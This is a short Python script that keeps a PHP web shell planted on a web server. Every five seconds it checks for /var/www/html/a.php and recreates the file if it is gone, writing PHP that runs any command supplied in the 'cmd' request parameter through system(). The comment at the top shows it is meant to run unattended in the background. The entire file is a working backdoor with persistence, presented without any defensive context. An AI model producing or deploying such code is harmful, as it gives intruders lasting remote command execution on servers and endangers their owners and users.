# nohup python /path/auto.py &
import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/var/www/html/a.php') 
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(5)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            a = open('/var/www/html/a.php','a') 
            a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>') # ?cmd=cwd (command)
            a.close()
            time.sleep(5)
main()
